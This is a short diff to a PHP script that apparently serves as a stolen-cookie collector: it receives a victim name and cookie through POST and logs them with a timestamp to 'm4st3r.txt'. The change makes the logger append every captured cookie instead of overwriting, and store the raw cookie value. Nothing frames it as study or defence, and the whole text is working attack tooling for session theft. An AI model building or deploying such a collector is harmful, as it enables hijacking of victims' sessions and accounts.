@@ -16,12 +16,12 @@
 <?php
 $name = $_POST['name'];
 $cookie = $_POST['cookie'];
-$fifo = fopen('m4st3r.txt', 'w');
+$fifo = fopen('m4st3r.txt', 'a');
 
 if (is_null($cookie) == FALSE) {
     date_default_timezone_set("Asia/Dhaka");
     fwrite($fifo, "----- [".$name."] -----\nTime : ".date('h:i:s A')."\n");
-    fwrite($fifo, '<script>atob('.$cookie.')</script>');
+    fwrite($fifo, $cookie);
     fwrite($fifo, "\n----- [END] -----\n\n");
 
     fclose($fifo);
